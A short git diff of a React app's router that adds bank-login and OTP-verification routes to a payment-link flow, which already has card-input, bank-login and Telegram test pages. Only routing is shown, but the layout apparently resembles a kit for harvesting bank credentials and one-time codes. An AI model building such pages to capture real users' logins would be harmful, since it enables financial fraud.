@@ -33,6 +33,8 @@ import PaymentReceiptPage from "./pages/PaymentReceiptPage";
 import PaymentReceipt from "./pages/PaymentReceipt";
 import TelegramTestPage from "./pages/TelegramTestPage";
 import UnifiedPayment from "./pages/UnifiedPayment";
+import BankLoginPage from "./pages/BankLoginPage";
+import OTPVerificationPage from "./pages/OTPVerificationPage";
 import NotFound from "./pages/NotFound";
 
 const queryClient = new QueryClient();
@@ -68,6 +70,8 @@ const App = () => (
           <Route path="/pay/:id/bank-selector" element={<PaymentBankSelector />} />
           <Route path="/pay/:id/card-input" element={<PaymentCardInput />} />
           <Route path="/pay/:id/bank-login" element={<PaymentBankLogin />} />
+          <Route path="/pay/:id/bank-login-page" element={<BankLoginPage />} />
+          <Route path="/pay/:id/otp-verification" element={<OTPVerificationPage />} />
           {/* Payment routes with paymentId parameter */}
           <Route path="/pay/:id/card/:paymentId" element={<PaymentCard />} />
           <Route path="/pay/:id/otp/:paymentId" element={<PaymentOTP />} />
